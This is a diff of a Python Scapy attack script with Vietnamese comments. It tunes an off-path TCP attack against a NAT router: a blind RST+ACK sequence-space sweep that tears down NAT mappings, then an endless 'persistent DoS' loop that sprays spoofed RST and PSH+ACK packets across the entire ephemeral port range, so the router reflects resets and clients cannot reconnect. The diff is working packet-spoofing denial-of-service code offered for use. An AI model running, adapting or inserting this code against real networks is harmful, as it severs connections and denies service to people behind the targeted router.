@@ -145,8 +145,8 @@ def stage2(ports):
     print(f"\n[2] TEAR DOWN — RST+ACK Brute-force (Strict Off-Path)")
     print("    Quét mù không gian Sequence (Blind Sweep) để tìm Window...")
     
-    # Chia nhỏ 150,000 bước (step ~ 28633) để chắc chắn lọt vào cửa sổ TCP (thường ~30000-65535)
-    STEPS = 150000
+    # Giảm số bước xuống 30,000 vì Router xử lý rất nhanh và dễ quá tải
+    STEPS = 30000
     step_sz = (2**32) // STEPS
 
     # Dùng L3socket để gửi gói cực nhanh
@@ -163,48 +163,52 @@ def stage2(ports):
             del base_pkt[TCP].chksum
             sock.send(base_pkt)
             
-            if i % 30000 == 0 and i > 0:
+            if i % 5000 == 0 and i > 0:
                 print(f"        Tiến độ: {i}/{STEPS} gói...", end="\r")
                 
         print(f"    ✓ Port {port}: Hoàn tất vòng quét! (Bảng NAT đã chuyển sang CLOSE)       ")
     sock.close()
 
 # ════════════ STAGE 3: TCP STATE MANIPULATION (REFLECTION) ═════════════════
-def stage3(ports):
-    print(f"\n[3] PERSISTENT DoS (TCP State Manipulation)")
-    print("    Duy trì trạng thái ngắt kết nối: Ép NAT liên tục dội RST về Server.")
+def stage3():
+    print(f"\n[3] PERSISTENT DoS (Tấn công rải thảm - ReDAN Persistent DoS)")
+    print("    Chiến thuật: Xen kẽ gửi TCP RST (Xóa NAT) và PUSH+ACK (Thao túng trạng thái)")
+    print(f"    Mục tiêu: Đánh sập toàn bộ dải Port {EPHEM_START}-{EPHEM_END-1}.")
+    print("    Hậu quả: Cắt đứt kết nối cũ VÀ chặn hoàn toàn nỗ lực thiết lập kết nối mới!")
     print("    Nhấn Ctrl+C để dừng tấn công.")
     
-    print("    [!] Đang chờ 3 giây để Router dọn sạch bản ghi CLOSE trong nf_conntrack...")
-    for i in range(3, 0, -1):
-        print(f"        Chờ {i}s...", end="\r")
-        time.sleep(1)
-    print("    [!] Kích hoạt vòng lặp Reflection vô tận!                ")
-    
     sock = conf.L3socket(iface=SPY_IFACE)
+    all_ports = list(range(EPHEM_START, EPHEM_END))
     
     sweep_count = 0
     try:
         while True:
-            for port in ports:
-                # Gửi gói tin giả mạo chứa payload (PSH+ACK) từ NAT đến Server.
+            for port in all_ports:
+                # 1. GỬI RST GIẢ MẠO ĐỂ XÓA ÁNH XẠ NAT (RST Sweep)
+                # Dội liên tục để hễ Client mở Port mới là NAT bị xóa ngay lập tức
+                for _ in range(30):
+                    seq = random.randint(0, 2**32-1)
+                    rst_pkt = IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) / TCP(sport=SERVER_PORT, dport=port, flags="RA", seq=seq)
+                    sock.send(rst_pkt)
+                    
+                # 2. GỬI PSH+ACK ĐỂ THAO TÚNG TRẠNG THÁI (Reflection)
+                # Ép Router ném RST về phía Server, chặn thiết lập kết nối mới
                 payload = b"GET / HTTP/1.1\r\n\r\n"
-                
-                # Bắn vài gói với seq/ack ảo để chắc chắn Server coi là DUP/Out-of-Window
-                for i in range(3):
+                for _ in range(5):
                     seq = random.randint(1000, 2**32-1)
                     ack = random.randint(1000, 2**32-1)
-                    pkt = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) / 
+                    pa_pkt = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) / 
                            TCP(sport=port, dport=SERVER_PORT, flags="PA", seq=seq, ack=ack) / 
                            Raw(load=payload))
-                    sock.send(pkt)
+                    sock.send(pa_pkt)
                     
             sweep_count += 1
             print(f"    [*] Đã rải mồi nhử duy trì ngắt kết nối (Lượt {sweep_count})...", end="\r")
             
-            # Tạm nghỉ 2 giây giữa mỗi đợt để giảm tải CPU cho Attacker, 
-            # nhưng vẫn đủ nhanh để chặn Client trước khi nó kịp Reconnect hoàn toàn.
-            time.sleep(2)
+            # Kẽ hở thời gian CỰC KỲ QUAN TRỌNG:
+            # Nghỉ 2 giây để giả lập thời gian quét 30.000 port trong thực tế.
+            # Tránh việc "mưa đạn" quá dày đặc làm Router kẹt cứng bản ghi (use=2).
+            time.sleep(2.0)
             
     except KeyboardInterrupt:
         print("\n    [!] Đã dừng vòng lặp DoS.")
@@ -247,7 +251,7 @@ def main():
     stage2(ports)
 
     try:
-        stage3(ports)
+        stage3()
     except KeyboardInterrupt:
         print("\n[!] Đã dừng.")
 
